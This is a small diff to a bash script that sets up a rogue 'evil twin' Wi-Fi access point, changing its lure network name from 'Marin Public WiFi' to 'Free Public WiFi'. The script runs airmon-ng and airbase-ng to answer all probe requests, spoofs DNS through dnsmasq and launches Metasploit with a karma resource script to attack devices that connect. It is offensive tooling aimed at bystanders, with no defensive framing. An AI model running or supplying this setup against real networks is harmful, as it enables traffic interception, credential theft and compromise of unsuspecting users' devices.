@@ -8,7 +8,7 @@ if [[ $# -eq 0 ]] ; then
 fi
 echo $1>./inf
 airmon-ng start $1
-airbase-ng -P -C 30 -e "Marin Public WiFi" -v $1
+airbase-ng -P -C 30 -e "Free Public WiFi" -v $1
 ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
 terminator -e "dnsmasq -C ~/karmetasploit/dhspoof.jk" 2>/dev/null &
 msfconsole -r ~/karmetasploit/karma.rc
